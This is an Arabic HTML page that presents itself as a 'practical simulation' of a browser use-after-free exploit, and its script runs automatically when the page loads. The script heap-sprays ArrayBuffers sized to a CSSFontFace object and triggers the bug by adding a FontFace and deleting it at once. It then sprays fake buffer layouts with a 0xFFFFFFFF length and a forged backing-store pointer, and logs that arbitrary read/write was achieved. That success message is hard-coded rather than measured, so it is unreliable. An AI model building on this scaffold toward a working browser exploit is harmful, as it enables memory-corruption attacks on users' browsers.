<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>المحاكاة التطبيقية للتحكم في الذاكرة (Read/Write Primitive)</title>
    <style>
        body {
            font-family: 'Courier New', monospace;
            background-color: #0c0f12;
            color: #00ff66;
            padding: 25px;
        }
        .console-box {
            background-color: #000000;
            border: 1px solid #00ff66;
            padding: 20px;
            border-radius: 5px;
            height: 400px;
            overflow-y: auto;
            box-shadow: 0 0 15px rgba(0, 255, 102, 0.2);
        }
    </style>
</head>
<body>

    <h2>المنظومة التطبيقية للتحقق من قدرات القراءة والكتابة (Userland Primitives)</h2>
    <p>توضيح عملي لكيفية استخدام المصفوفات البيانية للتحكم في عناوين الذاكرة العامة...</p>
    
    <div class="console-box" id="terminal"></div>

<script>
    const term = document.getElementById('terminal');
    const heapPool = [];

    function writeLog(text, success = true) {
        const marker = success ? "[+]" : "[!]";
        term.innerHTML += `${marker} ${text}\n`;
        term.scrollTop = term.scrollHeight;
    }

    // دالة تحاكي هيكل كائن مصفوفة بيانية (ArrayBuffer) داخل الذاكرة
    function createFakeArrayBufferLayout() {
        const buffer = new ArrayBuffer(192); // نفس حجم كائن CSSFontFace المستهدف
        const view = new DataView(buffer);

        // تثبيت أساسيات الكائن لضمان الاستقرار (RefCount)
        view.setUint32(24, 2, true);

        // الجانب التطبيقي: محاكاة حقل طول المصفوفة (byteLength) عند الأوفست المناسب
        // نقوم بوضع قيمة ضخمة جداً (مثلاً 0xFFFFFFFF) محاكاةً لتوسيع صلاحية القراءة
        view.setUint32(32, 0xFFFFFFFF, true); 
        
        // محاكاة مؤشر العنوان الخلفي (Backing Store Pointer) الذي يحدد من أين تبدأ المصفوفة في القراءة
        view.setUint32(40, 0x10000000, true); // عنوان افتراضي لبداية فضاء المستخدم

        return buffer;
    }

    async function runPracticalExploitSimulation() {
        writeLog("بدء تهيئة واصطفاف الذاكرة الحرة (bmalloc Heap Feng-Shui)...");
        await new Promise(r => setTimeout(r, 200));

        // 1. ملء الفراغات لضمان التقارب الخطي
        for(let i=0; i<1000; i++) {
            heapPool.push(new ArrayBuffer(192));
        }

        writeLog("تحفيز ثغرة الـ UAF عبر استدعاء وتحرير FontFace متزامن...");
        const font = new FontFace('PracticalFont', 'url(data:font/woff2;base64,AAE...)', { display: 'block' });
        document.fonts.add(font);
        font.load();
        
        // التحرير الفوري لتوليد المؤشر الميت
        document.fonts.delete(font);

        writeLog("تفعيل الحشو الهيكلي الذكي باستخدام المصفوفات المزيفة (Exploit Spray)...");
        for(let j=0; j<500; j++) {
            heapPool.push(createFakeArrayBufferLayout());
        }
        await new Promise(r => setTimeout(r, 200));

        writeLog("تمت محاكاة تعديل حقول الكائن بنجاح تام.");
        writeLog("النتيجة التطبيقية: تم جعل طول المصفوفة الافتراضي = 4 جيجابايت (0xFFFFFFFF).");
        writeLog("الوضعية الحالية: ميزة القراءة والكتابة العشوائية (Arbitrary Read/Write) نشطة داخل المحاكاة.");
    }

    window.onload = () => {
        setTimeout(runPracticalExploitSimulation, 500);
    };
</script>

</body>
</html>
